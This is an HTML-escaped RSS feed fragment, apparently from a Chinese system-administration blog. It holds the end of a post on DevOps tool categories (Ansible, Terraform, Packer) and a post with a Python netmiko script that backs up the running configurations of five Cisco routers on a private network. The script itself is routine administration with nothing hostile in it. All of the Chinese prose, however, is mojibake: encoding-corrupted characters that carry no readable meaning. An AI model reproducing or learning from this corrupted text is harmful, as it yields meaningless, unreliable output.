&lt;p&gt;åœ¨ infosys é¢è¯•è¢«ä¸€ä¸ªå°åº¦è€å¤–é—®åˆ°è¿™é—®é¢˜ï¼Œå› ä¸ºå¹³æ—¶æ ¹æœ¬ä¸ç”¨ansible çš„ ad hoc ç‚¹å¯¹ç‚¹æ¨¡å¼ï¼Œç»“æœè¢«å½“åœºé—®ä½ã€‚ç°åœ¨æ‰çŸ¥é“è¿™ç©æ„æ˜¯ä»€ä¹ˆã€‚å½“ç„¶ï¼Œç”¨ ansible çš„è¯ä¸å»ºè®®ç”¨è¿™ä¸ªï¼Œå› ä¸º playbook æ˜¯å¯è¿½æº¯çš„ã€‚&lt;/p&gt;
&lt;h4 id=&#34;äºŒconfiguration-management-tools&#34;&gt;äºŒã€Configuration Management tools&lt;/h4&gt;
&lt;p&gt;é…ç½®ç®¡ç†ï¼Œè¿™é‡Œå½“ç„¶æ¨è ansibleï¼Œæ¯ä¸€æ­¥çš„æ“ä½œéƒ½å¯ä»¥æœ‰ inventory å’Œ playbook å¯ä»¥è¿½æº¯ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä¸‰orchestration-tools&#34;&gt;ä¸‰ã€Orchestration tools&lt;/h4&gt;
&lt;p&gt;ååŒå·¥å…·ï¼Œk8så’Œkvm&lt;/p&gt;
&lt;h4 id=&#34;å››provisioning-tools&#34;&gt;å››ã€Provisioning tools&lt;/h4&gt;
&lt;p&gt;ç”Ÿäº§å·¥å…·ï¼Œå½“ç„¶æ˜¯terraformï¼Œå¦å¤–ï¼Œé˜¿é‡Œäº‘æ˜¯æ”¯æŒplumiçš„ï¼Œåä¸ºè…¾è®¯ä¸æ”¯æŒã€‚&lt;/p&gt;
&lt;h4 id=&#34;äº”server-templating-tools&#34;&gt;äº”ã€Server Templating tools&lt;/h4&gt;
&lt;p&gt;æ¨¡æ¿å·¥å…·ï¼Œè¿™é‡Œå°±æ˜¯ Packerï¼Œå…¶å®æˆ‘ä»¬å…¬å¸ç°åœ¨çš„æ¨¡æ¿å·¥å…·ï¼Œæ˜¯å…«æˆ’ä»openstackå­¦çš„ï¼Œæ”¹åŠ¨Cloud-initçš„ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;p&gt;Packeræ›´æ ‡å‡†ä¸€ä¸‹ï¼Œæ˜¯è¿›åŒ–ç‰ˆçš„ä¸œè¥¿ï¼Œå®ƒæ—¢å¯ä»¥æ‰“kvmé•œåƒï¼Œä¹Ÿå¯ä»¥æ‰“Dockeré•œåƒã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬å°±çœ‹çœ‹æ€ä¹ˆä½¿ç”¨å§ï¼Œè¿™é‡Œå…ˆè¯´kvmï¼Œå› ä¸ºkvmçš„æ¯”è¾ƒéš¾ï¼Œdockerçš„å…«æˆ’ç°åœ¨è¿˜æ˜¯ç”¨Dockerfileï¼Œæœ‰ç©ºäº†å†ç ”ç©¶packerï¼š&lt;/p&gt;
&lt;p&gt;å®‰è£…å°±ä¸å¤šè¯´äº†ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å°±è¡Œï¼Œä¸ç”¨è£…ã€‚&lt;/p&gt;
&lt;p&gt;Packerçš„æ ¸å¿ƒæ˜¯ä¸‰ä¸ªéƒ¨åˆ†&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;builders&lt;/li&gt;
&lt;li&gt;provisioners&lt;/li&gt;
&lt;li&gt;post-processors&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªç©ºç›®å½•ï¼Œåå­—éšä¾¿ï¼Œå°±å« test-image&lt;/p&gt;</description>
    </item>
    <item>
      <title>Ciscoè®¾å¤‡è‡ªåŠ¨æ‰§è¡Œå’Œå¤‡ä»½çš„è„šæœ¬</title>
      <link>https://rendoumi.com/posts/20220717-backup_cisco/</link>
      <pubDate>Sun, 17 Jul 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220717-backup_cisco/</guid>
      <description>&lt;p&gt;åœ¨æ—¥å¸¸å·¥ä½œä¸­æˆ‘ä»¬ç»å¸¸è¦å¯¹ Cisco çš„ç½‘ç»œè®¾å¤‡çš„é…ç½®è¿›è¡Œå¤‡ä»½ï¼Œæˆ–è€…å’Œ suricata è”åŠ¨çš„æ—¶å€™è¦æ‰§è¡Œæ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;æ–¹æ³•å…¶å®å¾ˆç®€å•ï¼Œè°ƒç”¨ python çš„ç›¸åº”æ¨¡å—å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å‡†å¤‡å·¥ä½œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½ python 3.6,  pip install netmiko&lt;/p&gt;
&lt;p&gt;å…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç &lt;/p&gt;
&lt;p&gt;ç„¶åä¾æ¬¡æ‰§è¡Œå¤‡ä»½å°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/export/servers/python363/bin/python3.6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;netmiko&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Netmiko&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_bgp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-bgp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.10&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;secret&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r1_e1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r1-e1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.11&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r1_e2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r1-e2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.12&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r2_e1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r2-e1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.13&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;tw_r2_e2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;device_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cisco_ios&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;tw-r2-e2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.1.14&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;noc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;use_keys&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;key_file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/root/.ssh/id_jump_rsa_new&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;devices&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tw_bgp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r1_e1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r1_e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r2_e1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tw_r2_e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;devices&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ip&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Netmiko&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;out&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send_command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;show running-config&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;calender&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strftime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Y%m&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;calender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_name&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
